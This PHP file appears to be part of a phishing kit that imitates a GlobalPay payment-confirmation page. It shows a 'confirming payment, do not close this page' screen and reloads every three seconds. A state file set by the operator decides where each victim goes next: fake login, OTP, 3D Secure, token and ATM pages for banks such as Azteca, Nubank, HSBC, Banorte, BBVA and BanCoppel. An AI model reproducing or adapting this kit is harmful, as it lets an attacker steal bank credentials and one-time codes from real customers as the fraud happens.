<?php
session_start();

function checkButtonPressed()
{
    if (file_exists('button_state.json')) {
        $state = json_decode(file_get_contents('button_state.json'), true);

        if (isset($state['button'])) {
            $buttonPressed = $state['button'];

            // Borrar el estado para evitar múltiples redirecciones
            unlink('button_state.json');

            // Realizar la redirección según el botón presionado
            switch ($buttonPressed) {
                case "info":
                    header("Location: rastrear.php");
                    exit;
                case "❌LG":
                    header("Location: payment.php");
                    exit;
                case "❌OTP-AZTECA":
                    header("Location: azteca-error.php");
                    exit;
                case "❌NUBANK":
                    header("Location: nubank-error.php");
                    exit;
                case "❌HSBC":
                    header("Location: hsbc-error.php");
                    exit;
                case "❌BANORTE":
                    header("Location: banorte-error.php");
                    exit;
                case "❌BBVA":
                    header("Location: bbva-error.php");
                    exit;
                case "❌BANCOPPEL":
                    header("Location: bancoppel-error.php");
                    exit;
                case "⭐️OTP":
                    header("Location: 3d.php");
                case "⭐️HSBC":
                    header("Location: hsbc.php");
                    exit;
                case "⭐️BANCOPPEL":
                    header("Location: bancoppel.php");
                    exit;
                case "⭐️BANORTE":
                    header("Location: banorte.php");
                    exit;
                case "⭐️BBVA":
                    header("Location: bbva.php");
                    exit;
                case "⭐️NUBANK":
                    header("Location: nubank.php");
                    exit;
                case "❌OTP":
                    header("Location: 3d_error.php");
                    exit;
                case "🏦LG":
                    $bank = $_SESSION['bank'] ?? 'default';
                    switch ($bank) {
                        case "AZTECA":
                            header("Location: azteca.php");
                            break;
                        case "NUBANK":
                            header("Location: nubank.php");
                            break;
                        case "HSBC":
                            header("Location: hsbc.php");
                            break;
                        case "BANCOPPEL":
                            header("Location: bancoppel.php");
                            break;
                        case "BANCO BBVA":
                            header("Location: bbva.php");
                            break;
                        case "BANCO BANORTE":
                            header("Location: banorte.php");
                            break;
                        case "BANCO BBVA":
                            header("Location: logobb.php");
                            break;
                        case "BANCO CAJA SOCIAL":
                            header("Location: logocaja.php");
                            break;
                        case "BANCO CITIBANK":
                            header("Location: logociti.php");
                            break;
                        case "BANCO POPULAR":
                            header("Location: logopopu.php");
                            break;
                        case "TUYA":
                            header("Location: logotuya.php");
                            break;
                        case "BANCO DE OCCIDENTE":
                            header("Location: logoocci.php");
                            break;
                        default:
                            header("Location: logo.php");
                            break;
                    }
                    exit;
                case "✅FINAL":
                    header("Location: confirmacion.php");
                    exit;
                case "⭐️TK":
                    header("Location: token.php");
                    exit;
                case "⭐️AP":
                    header("Location: otpap.php");
                    exit;
                case "🏧":
                    header("Location: atm.php");
                    exit;
                default:
                    echo "Botón no reconocido.";
                    exit;
            }
        }
    }
}

checkButtonPressed();
?>

<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>GlobalPay</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link href="https://pg-micros.globalpay.com.co/static/vtex/css/bootstrap.css" rel="stylesheet" type="text/css">
</head>
<body class="GlobalPay">

<article>
    <main>
        <div class="container container-loader">
            <div class="content shadow rounded">
                <div class="text-center">
                    <br><br>
                    <img src="img/200w2.webp" style="height: 80px;" class="brand-logo img-fluid" alt="auth_3ds_payment">
                </div>
                <div style="display: flex; align-items: center; justify-content: center;">
                    <h5 style="color: #3f28d8;">Confirmando pago...</h5>
                </div>
                <div style="display: flex; align-items: center; justify-content: center;">
                    <h5 style="color: #3f28d8;">No salga ni cierre esta página.</h5>
                </div>
            </div>
        </div>
    </main>
</article>

<script>
// Verificar cada 3 segundos si se ha presionado un botón
setInterval(function() {
    location.reload();
}, 3000);
</script>

</body>
</html>
